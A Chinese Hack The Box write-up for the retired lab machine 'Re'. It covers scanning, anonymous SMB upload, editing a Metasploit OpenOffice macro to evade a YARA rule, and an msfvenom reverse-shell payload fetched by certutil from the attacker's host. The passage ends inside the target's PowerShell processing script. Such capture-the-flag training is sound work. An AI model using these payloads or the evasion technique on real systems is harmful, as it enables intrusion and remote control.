# HTB-Re 渗透全记录
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
春节闭门不出，在家刷HTB练习渗透，目前Re这个box已经retired，因此把总结的详细渗透过程发出来。这个box用到了OpenOffice宏后门，Winrar目录穿越和UsoSvc服务提权。最后拿到system权限读flag还折腾了不少，整个过程都值得学习一下。
## Port
    root@kali:~/pentest/re# masscan -e tun0 -p1-65535 10.10.10.144 --rate=1000
    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2020-01-26 08:03:07 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 1 hosts [65535 ports/host]
    Discovered open port 445/tcp on 10.10.10.144
    Discovered open port 80/tcp on 10.10.10.144
    root@kali:~/pentest/re# nmap -sC -sV -oA Re -p80,445 10.10.10.144
    Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-26 08:06 GMT
    Nmap scan report for 10.10.10.144
    Host is up (0.25s latency).
    PORT    STATE SERVICE       VERSION
    80/tcp  open  http          Microsoft IIS httpd 10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Visit reblog.htb
    445/tcp open  microsoft-ds?
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    Host script results:
    |_clock-skew: mean: 1h01m10s, deviation: 0s, median: 1h01m10s
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2020-01-13 09:09:21
    |_  start_date: N/A
扫描只发现了一个http服务和smb共享文件服务
## Blog
根据nmap扫描的提示，直接把域名ip写入hosts
    echo -e "10.10.10.144treblog.htb" >> /etc/hosts
访问web，发现是一个blog，有几篇博文需要注意一下。
简要内容就是作者开放了一个ods文件宏后门检测的服务，使用yara进行过滤。
## smb
直接尝试匿名访问smb，发现存在一个叫`malware_dropbox`的共享文件夹。
    root@kali:~# smbmap -H 10.10.10.144 -u 'anonymous' -p ''
    [+] Finding open SMB ports....
    [+] Guest SMB session established on 10.10.10.144...
    [+] IP: 10.10.10.144:445        Name: 10.10.10.144
            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------            .
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
            fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-334-0
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-1c0-0
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-3e4-0
            fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-3a8-0
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-680-0
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
            fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-24c-0
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-258-0
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOTCIMV2SCM EVENT PROVIDER
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234368815825955.1856.DefaultAppDomain.powershell
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234368815872644.1884.DefaultAppDomain.powershell
            fr--r--r--                3 Sun Dec 31 19:03:58 1600    efsrpc
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234370425623129.3428.DefaultAppDomain.powershell
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipma879ea91-3bc1-4fb6-89d7-9d62fc5e507f
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    iislogpipec892292b-ab19-499e-bbef-39bdba027ff4
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    S1zLwjQTPA0xOsRWCq9N6MQFkt9b9GCIUZvroK94XUHcG4BhfCfDionXk4R8bvw9fccVl0BHbUaIG4hGK4g9rLbSmGvzCKClSU7FNe66HfCMo4aqTxNFEy
            fr--r--r--                1 Sun Dec 31 19:03:58 1600    CPFATP_3652_v4.0.30319
            IPC$                                                    READ ONLY       Remote IPC
            .
            dr--r--r--                0 Mon Jan 13 20:51:16 2020    .
            dr--r--r--                0 Mon Jan 13 20:51:16 2020    ..
            malware_dropbox                                         READ ONLY
此目录虽然扫描发现只有`READ
ONLY`，而实际上是可以上传文件的。随便上传一个文件，发现过1分钟左右就会消失，相信就是上面blog提到的ods文件检测服务入口了。
    root@kali:~/pentest/re# smbclient \\10.10.10.144\malware_dropbox
    WARNING: The "syslog" option is deprecated
    WARNING: The "syslog" option is deprecated
    Enter WORKGROUProot's password:
    Try "help" to get a list of possible commands.
    smb: > ls
      .                                   D        0  Tue Jun 18 22:08:36 2019
      ..                                  D        0  Tue Jun 18 22:08:36 2019
                    8247551 blocks of size 4096. 4295441 blocks available
    smb: > put Re.xml
    putting file Re.xml as Re.xml (3.2 kb/s) (average 2.4 kb/s)
    smb: > ls
      .                                   D        0  Mon Jan 13 09:26:31 2020
      ..                                  D        0  Mon Jan 13 09:26:31 2020
      Re.xml                              A     2410  Mon Jan 13 09:26:31 2020
    ls
                    8247551 blocks of size 4096. 4295440 blocks available
    smb: > ls
      .                                   D        0  Mon Jan 13 09:26:35 2020
      ..                                  D        0  Mon Jan 13 09:26:35 2020
                    8247551 blocks of size 4096. 4295441 blocks available
    smb: >
## ODS
这篇博文里面提及一篇文章： ，里面有生成ods文件的示例，以及提到一个yara过滤规则：
    rule metasploit
    {
            strings:
                            $getos = "select case getGUIType" nocase wide ascii
                            $getext = "select case GetOS" nocase wide ascii
                            $func1 = "Sub OnLoad" nocase wide ascii
                            $func2 = "Sub Exploit" nocase wide ascii
                            $func3 = "Function GetOS() as string" nocase wide ascii
                            $func4 = "Function GetExtName() as string" nocase wide ascii
                    condition:
                        (all of ($get*) or 2 of ($func*))
    }
这个规则的意思是：匹配到全部$get开头的规则 或者 任意两个$func开头的规则，就无法通过。
    use exploit/multi/misc/openoffice_document_macro
    set srvhost 10.10.14.220
    set srvport 23333
    run
    [+] msf.odt stored at /root/.msf4/local/msf.odt
按照文章的介绍，可以直接使用metasploit生成一个恶意odt文件，而上面的yara规则明显是针对metasploit的，因此需要修改一下宏脚本进行绕过。
odt文件本质为一个zip压缩包，将生成的msf.odt解压。
修改 `/Basic/Standard/Module1.xml`中的宏脚本，删除多余的`Sub
Exploit`，`GetOS()`和`GetExtName()`
同时，由于不清楚有没有其他过滤规则，因此选择了使用certutil来下载shell.exe，尽量不使用`powershell`反弹脚本。
重新打包，重命名为msf.ods
然后用msfvenom生成一个后门程序shell.exe放在本地。
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.220 LPORT=4444 -f exe -i 3 -o shell.exe
开启http服务
    python3 -m http.server 23333
msfconsole配置handler进行监听
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
然后用smbclient把生成的msf.ods恶意文件上传到smb
    root@kali:~/pentest/Re# smbclient \\10.10.10.144\malware_dropbox
    Enter WORKGROUProot's password:
    Try "help" to get a list of possible commands.
    smb: > put msf.ods
然后稍等片刻，http服务会提示靶机访问shell.exe，然后shell就会弹回来，到此获取到一个flag。
    C:UserslukeDesktop>type user.txt
    type user.txt
    FE4173xxxxxxxxxxxxx0D9F384D3
## Winrar 目录穿越
查看当前用户的Documents目录，可以看到自动处理ods文件的脚本和过滤规则
     Directory of C:UserslukeDocuments
    06/18/2019  01:05 PM              .
    06/18/2019  01:05 PM              ..
    01/13/2020  09:16 PM              malware_dropbox
    01/13/2020  09:16 PM              malware_process
    01/13/2020  09:16 PM              ods
    06/18/2019  09:30 PM             1,096 ods.yara
    06/18/2019  09:33 PM             1,783 process_samples.ps1
    03/13/2019  05:47 PM         1,485,312 yara64.exe
                   3 File(s)      1,488,191 bytes
                   5 Dir(s)  17,590,632,448 bytes free
ods.yara
基本上把大部分powershell关键字都过滤，上面用来下载执行后门的方式还是比较稳的。
process_samples.ps1
    $process_dir = "C:UserslukeDocumentsmalware_process"
    $files_to_analyze = "C:UserslukeDocumentsods"
    $yara = "C:UserslukeDocumentsyara64.exe"
    $rule = "C:UserslukeDocumentsods.yara"
    while($true) {
        # Get new samples
        move C:UserslukeDocumentsmalware_dropbox* $process_dir
        # copy each ods to zip file
        Get-ChildItem $process_dir -Filter *.ods | 
        Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}
        Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {
            # unzip archive to get access to content
            $unzipdir = Join-Path $_.directory $_.Basename
            New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
            Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
            # yara to look for known malware
            $yara_out = & $yara -r $rule $unzipdir
            $ods_name = $_.fullname -replace ".zip", ".ods"
            if ($yara_out.length -gt 0) {
                Remove-Item $ods_name
            }
        }
        # if any ods files left, make sure they launch, and then archive:
        $files = ls $process_dir*.ods
        if ( $files.length -gt 0) { 
            # launch ods files
            Invoke-Item "C:UserslukeDocumentsmalware_process*.ods"
            Start-Sleep -s 5
            # kill open office, sleep
            Stop-Process -Name soffice*
            Start-Sleep -s 5
            #& 'C:Program Files (x86)WinRARRar.exe' a -ep $process_dirtemp.rar $process_dir*.ods 2>&1 | Out-Null
            Compress-Archive -Path "$process_dir*.ods" -DestinationPath "$process_dirtemp.zip"
            $hash = (Get-FileHash -Algorithm MD5 $process_dirtemp.zip).hash
            # Upstream processing may expect rars. Rename to .rar
            Move-Item -Force -Path $process_dirtemp.zip -Destination $files_to_analyze$hash.rar    
        }
        Remove-Item -Recurse -force -Path $process_dir*
        Start-Sleep -s 5